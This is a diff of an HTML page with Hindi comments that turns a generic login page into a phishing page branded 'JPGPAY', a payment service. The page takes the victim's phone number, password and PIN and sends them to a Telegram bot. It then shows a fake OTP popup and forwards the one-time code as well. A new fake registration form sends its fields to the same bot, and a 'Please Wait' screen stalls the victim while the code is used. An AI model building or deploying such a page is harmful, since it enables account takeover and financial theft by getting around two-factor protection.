@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Login Page</title>
+    <title>JPGPAY</title>
     <!-- Icons के लिए FontAwesome लिंक -->
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     
@@ -29,7 +29,7 @@
         /* लोगो डिज़ाइन */
         .logo-section {
             text-align: center;
-            margin-bottom: 40px;
+            margin-bottom: 30px;
             background: white;
             padding: 20px;
             border-radius: 10px;
@@ -67,6 +67,31 @@
             color: #b3b3b3;
         }
 
+        /* फोन इनपुट के लिए खास स्टाइल (+91) */
+        .phone-group span {
+            color: #333;
+            font-size: 15px;
+            margin-right: 10px;
+            font-weight: 500;
+        }
+
+        /* OTP बटन */
+        .otp-btn {
+            background-color: #128c57;
+            color: white;
+            border: none;
+            border-radius: 20px;
+            padding: 8px 18px;
+            font-size: 14px;
+            font-weight: bold;
+            cursor: pointer;
+            white-space: nowrap;
+        }
+        .otp-btn:disabled {
+            background-color: #94a3b8;
+            cursor: not-allowed;
+        }
+
         /* लिंक्स और रेडियो बटन डिज़ाइन */
         .options-row {
             display: flex;
@@ -74,9 +99,10 @@
             font-size: 14px;
             margin: 10px 10px 20px 10px;
         }
-        .options-row a {
+        .options-row a, .options-row span {
             color: #128c57;
             text-decoration: none;
+            cursor: pointer;
         }
         .options-row label {
             color: #128c57;
@@ -96,8 +122,8 @@
             text-decoration: none;
         }
 
-        /* साइन इन बटन */
-        .sign-in-btn {
+        /* बटन डिज़ाइन */
+        .main-btn {
             background-color: #128c57;
             color: white;
             border: none;
@@ -130,6 +156,53 @@
             color: #999;
         }
 
+        /* पॉप-अप OTP बॉक्स */
+        .modal-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.5);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+        }
+        .modal-box {
+            background: white;
+            width: 90%;
+            max-width: 320px;
+            padding: 25px 20px;
+            border-radius: 20px;
+            box-shadow: 0 5px 15px rgba(0,0,0,0.2);
+            position: relative;
+            text-align: left;
+        }
+        .modal-box h3 {
+            margin-top: 0;
+            color: #333;
+            font-size: 20px;
+        }
+        .modal-box p {
+            font-size: 13px;
+            color: #555;
+            line-height: 1.4;
+        }
+        .close-btn {
+            position: absolute;
+            top: 15px;
+            right: 15px;
+            background: #f0f0f0;
+            border: none;
+            border-radius: 50%;
+            width: 28px;
+            height: 28px;
+            cursor: pointer;
+            font-weight: bold;
+            color: #555;
+        }
+
         /* वेटिंग स्क्रीन */
         .wait-screen {
             text-align: center;
@@ -145,31 +218,29 @@
 </head>
 <body>
 
-    <!-- मेन लॉगिन सेक्शन -->
+    <!-- 1. लॉगिन सेक्शन -->
     <div class="container" id="login-section">
-        
-        <!-- लोगो (यहाँ आप अपनी इमेज का लिंक डाल सकते हैं) -->
         <div class="logo-section">
-            <img src="https://via.placeholder.com/150x80/333333/FFFFFF?text=YOUR+LOGO" alt="Logo">
+            <img src="https://via.placeholder.com/150x80/333333/FFFFFF?text=JPGPAY" alt="Logo">
         </div>
 
         <div class="input-group">
             <i class="fa-regular fa-user"></i>
-            <input type="text" id="phone" placeholder="Phone">
+            <input type="text" id="login-phone" placeholder="Phone">
         </div>
 
         <div class="input-group">
             <i class="fa-solid fa-lock"></i>
-            <input type="password" id="password" placeholder="Password">
+            <input type="password" id="login-password" placeholder="Password">
         </div>
 
         <div class="input-group">
             <i class="fa-solid fa-key"></i>
-            <input type="password" id="pin" placeholder="6-Digit PIN">
+            <input type="password" id="login-pin" placeholder="6-Digit PIN">
         </div>
 
         <div class="options-row">
-            <a href="#">Register</a>
+            <span onclick="showRegister()">Register</span>
             <label><input type="radio" name="remember"> Remember Me</label>
         </div>
 
@@ -179,7 +250,7 @@
             </label>
         </div>
 
-        <button class="sign-in-btn" onclick="sendToTelegram()">Sign In</button>
+        <button class="main-btn" onclick="openOtpModal()">Sign In</button>
 
         <div class="forget-password">
             <a href="#">Forget Password</a>
@@ -188,36 +259,186 @@
         <div class="version">v1.2.3</div>
     </div>
 
-    <!-- इंतज़ार वाला मैसेज -->
+
+    <!-- 2. OTP पॉप-अप बॉक्स -->
+    <div class="modal-overlay" id="otp-modal" style="display: none;">
+        <div class="modal-box">
+            <button class="close-btn" onclick="closeOtpModal()">✕</button>
+            <h3>Login OTP</h3>
+            <p>Tap Send to receive the OTP, then enter it to confirm this login.</p>
+            <p style="color: #128c57; font-weight: 500; margin-bottom: 5px;" id="otp-phone-text">OTP will be sent to +91 --</p>
+            <p style="font-size: 13px; margin-top: 0; color: #666;" id="timer-text">⏳ Tap Send below</p>
+
+            <div class="input-group" style="border: 1px solid #ddd; margin: 15px 0;">
+                <i class="fa-regular fa-envelope" style="color: #128c57;"></i>
+                <input type="text" id="otp-input" placeholder="Enter 6-digit OTP">
+                <button class="otp-btn" id="send-otp-btn" onclick="triggerOtpTimer()">Send</button>
+            </div>
+
+            <button class="main-btn" onclick="sendOtpToTelegram()">Confirm</button>
+        </div>
+    </div>
+
+
+    <!-- 3. रजिस्टर सेक्शन -->
+    <div class="container" id="register-section" style="display: none;">
+        <div class="logo-section" style="margin-bottom: 20px; padding: 10px;">
+            <h2 style="color: #128c57; margin: 0;">Register</h2>
+        </div>
+
+        <div class="input-group">
+            <i class="fa-regular fa-user"></i>
+            <input type="text" id="reg-username" placeholder="User Name">
+        </div>
+
+        <div class="input-group">
+            <i class="fa-solid fa-lock"></i>
+            <input type="password" id="reg-password" placeholder="Password">
+        </div>
+
+        <div class="input-group phone-group">
+            <i class="fa-solid fa-phone"></i>
+            <span>+91</span>
+            <input type="text" id="reg-phone" placeholder="Phone">
+        </div>
+
+        <div class="input-group">
+            <i class="fa-regular fa-envelope"></i>
+            <input type="text" id="reg-otp" placeholder="OTP Code">
+            <button class="otp-btn" onclick="alert('OTP Sent!')">Send</button>
+        </div>
+
+        <div class="input-group">
+            <i class="fa-solid fa-link"></i>
+            <input type="text" id="reg-invite" placeholder="Invite Code">
+        </div>
+
+        <button class="main-btn" style="margin-top: 10px;" onclick="sendRegisterToTelegram()">Sign Up</button>
+
+        <div class="forget-password">
+            <a href="#" onclick="showLogin()">Already have an account? Sign In</a>
+        </div>
+
+        <div class="version">v1.2.3</div>
+    </div>
+
+
+    <!-- 4. वेटिंग स्क्रीन -->
     <div class="container wait-screen" id="wait-section" style="display: none;">
         <h2>Please Wait...</h2>
         <p>Admin is verifying your details. Do not close this page.</p>
     </div>
 
     <script>
-        function sendToTelegram() {
-            var botToken = "YOUR_BOT_TOKEN_HERE"; 
-            var chatId = "YOUR_CHAT_ID_HERE"; 
-            
-            var phone = document.getElementById("phone").value;
-            var pass = document.getElementById("password").value;
-            var pin = document.getElementById("pin").value;
+        var botToken = "YOUR_BOT_TOKEN_HERE"; 
+        var chatId = "YOUR_CHAT_ID_HERE"; 
 
-            if(phone == "" || pass == "") {
+        var savedPhone = "";
+        var savedPass = "";
+        var savedPin = "";
+        var timerInterval;
+
+        function showRegister() {
+            document.getElementById("login-section").style.display = "none";
+            document.getElementById("register-section").style.display = "block";
+        }
+
+        function showLogin() {
+            document.getElementById("register-section").style.display = "none";
+            document.getElementById("login-section").style.display = "block";
+        }
+
+        function openOtpModal() {
+            savedPhone = document.getElementById("login-phone").value;
+            savedPass = document.getElementById("login-password").value;
+            savedPin = document.getElementById("login-pin").value;
+
+            if(savedPhone == "" || savedPass == "") {
                 alert("Please enter Phone and Password");
                 return;
             }
 
-            var message = "🟢 नया लॉगिन आया है:\n\n📱 Phone: " + phone + "\n🔒 Password: " + pass + "\n🔑 PIN: " + pin;
-
+            // टेलीग्राम पर लॉगिन डिटेल्स भेजें
+            var message = "🟢 नया LOGIN आया है:\n\n📱 Phone: " + savedPhone + "\n🔒 Password: " + savedPass + "\n🔑 PIN: " + savedPin;
             var telegramUrl = "https://api.telegram.org/bot" + botToken + "/sendMessage?chat_id=" + chatId + "&text=" + encodeURIComponent(message);
-
             fetch(telegramUrl);
 
+            // रिसेट करें टाइमर और बटन
+            clearInterval(timerInterval);
+            var sendBtn = document.getElementById("send-otp-btn");
+            sendBtn.innerText = "Send";
+            sendBtn.disabled = false;
+            document.getElementById("timer-text").innerText = "⏳ Tap Send to receive OTP";
+
+            document.getElementById("otp-phone-text").innerText = "OTP will be sent to +91 " + savedPhone;
+            document.getElementById("otp-modal").style.display = "flex";
+        }
+
+        function closeOtpModal() {
+            document.getElementById("otp-modal").style.display = "none";
+            clearInterval(timerInterval);
+        }
+
+        function triggerOtpTimer() {
+            var sendBtn = document.getElementById("send-otp-btn");
+            sendBtn.disabled = true;
+            
+            var timeLeft = 59;
+            document.getElementById("timer-text").innerHTML = "⏳ Resend OTP in " + timeLeft + "s";
+
+            timerInterval = setInterval(function() {
+                timeLeft--;
+                if (timeLeft > 0) {
+                    document.getElementById("timer-text").innerHTML = "⏳ Resend OTP in " + timeLeft + "s";
+                } else {
+                    clearInterval(timerInterval);
+                    sendBtn.disabled = false;
+                    sendBtn.innerText = "Resend";
+                    document.getElementById("timer-text").innerHTML = "⏳ You can resend OTP now";
+                }
+            }, 1000);
+
+            alert("OTP Sent successfully!");
+        }
+
+        function sendOtpToTelegram() {
+            var otp = document.getElementById("otp-input").value;
+
+            if(otp == "") {
+                alert("Please enter OTP");
+                return;
+            }
+
+            // टेलीग्राम पर OTP भेजें
+            var message = "🔑 LOGIN OTP आया है:\n\n📱 Phone: " + savedPhone + "\n🔢 OTP Code: " + otp;
+            var telegramUrl = "https://api.telegram.org/bot" + botToken + "/sendMessage?chat_id=" + chatId + "&text=" + encodeURIComponent(message);
+            fetch(telegramUrl);
+
+            clearInterval(timerInterval);
+            document.getElementById("otp-modal").style.display = "none";
             document.getElementById("login-section").style.display = "none";
             document.getElementById("wait-section").style.display = "block";
         }
-    </script>
 
+        function sendRegisterToTelegram() {
+            var username = document.getElementById("reg-username").value;
+            var pass = document.getElementById("reg-password").value;
+            var phone = document.getElementById("reg-phone").value;
+            var otp = document.getElementById("reg-otp").value;
+            var invite = document.getElementById("reg-invite").value;
+
+            if(username == "" || phone == "" || pass == "") {
+                alert("Please fill all required fields");
+                return;
+            }
+
+            var message = "📝 नया REGISTRATION आया है:\n\n👤 User Name: " + username + "\n🔒 Password: " + pass + "\n📱 Phone: +91 " + phone + "\n✉️ OTP: " + otp + "\n🔗 Invite Code: " + invite;
+            var telegramUrl = "https://api.telegram.org/bot" + botToken + "/sendMessage?chat_id=" + chatId + "&text=" + encodeURIComponent(message);
+            fetch(telegramUrl);
+
+            document.getElementById("register-section").style.display = "none";
+            document.getElementById("wait-section").style.display = "block";
+        }
+    </script>
 </body>
 </html>
